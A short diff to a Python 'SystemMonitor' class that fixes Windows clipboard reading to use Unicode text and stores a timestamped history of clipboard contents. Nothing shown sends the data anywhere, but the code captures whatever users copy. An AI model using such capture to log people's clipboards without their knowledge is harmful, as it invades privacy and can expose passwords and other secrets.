@@ -278,15 +278,15 @@ class SystemMonitor:
             if not user32.OpenClipboard(0):
                 return
             try:
-                cf_text = 13
+                cf_text = 13  # CF_UNICODETEXT
                 handle = user32.GetClipboardData(cf_text)
                 if handle:
                     ptr = ctypes.windll.kernel32.GlobalLock(handle)
                     if ptr:
-                        text = ctypes.c_char_p(ptr).value
+                        text = ctypes.c_wchar_p(ptr).value
                         ctypes.windll.kernel32.GlobalUnlock(handle)
                         if text:
-                            decoded = text.decode("utf-8", errors="replace")[:500]
+                            decoded = text[:500]
                             if decoded and decoded != self._last_clipboard:
                                 self._last_clipboard = decoded
                                 self._clipboard_history.append({"text": decoded, "ts": time.time()})
